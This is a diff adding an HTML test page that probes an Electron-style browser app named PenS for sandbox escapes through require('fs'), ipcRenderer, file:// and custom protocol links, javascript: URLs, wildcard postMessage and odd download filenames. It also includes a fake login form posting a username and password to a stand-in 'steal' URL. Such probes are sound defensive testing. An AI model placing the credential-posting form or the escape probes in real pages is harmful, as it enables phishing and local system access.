@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Security Test Page</title>
+</head>
+<body>
+  <h1>PenS Security Test Page</h1>
+  <button id="btn-require">Try require()</button>
+  <button id="btn-ipc">Try ipcRenderer</button>
+  <a href="pens://settings">Link to pens://settings</a>
+  <a href="file:///C:/">Link to file:///C:/</a>
+  <button onclick="window.open('javascript:alert(1)')">window.open javascript:</button>
+  <button onclick="top.postMessage('test', '*')">top.postMessage</button>
+  
+  <form action="http://example.com/steal" method="POST">
+    <input type="text" name="user" placeholder="Fake Login">
+    <input type="password" name="pass" placeholder="Password">
+    <button type="submit">Submit</button>
+  </form>
+
+  <a href="data:application/pdf;base64,JVBERi0xLgo=" download="CON.pdf">Download CON.pdf</a>
+  <a href="data:text/plain,test" download="a".repeat(300) + ".txt">Download long filename</a>
+
+  <script>
+    document.getElementById('btn-require').onclick = () => {
+      try { require('fs'); alert('VULNERABLE: require works!'); } catch(e) { alert('SECURE: ' + e.message); }
+    };
+    document.getElementById('btn-ipc').onclick = () => {
+      try { require('electron').ipcRenderer.send('test'); alert('VULNERABLE!'); } catch(e) { alert('SECURE: ' + e.message); }
+    };
+  </script>
+</body>
+</html>
